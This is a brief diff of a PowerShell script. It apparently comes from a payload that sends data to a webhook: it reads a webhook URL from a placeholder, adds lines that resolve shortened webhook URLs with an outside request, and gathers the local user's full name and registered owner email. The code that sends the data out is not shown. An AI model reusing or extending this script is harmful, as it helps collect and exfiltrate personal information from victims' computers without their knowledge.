@@ -1,4 +1,6 @@
 ﻿$hookurl = "$dc"
+# shortened URL Detection
+if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
 
 $userInfo = Get-WmiObject -Class Win32_UserAccount ;$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
 $email = (Get-ComputerInfo).WindowsRegisteredOwner
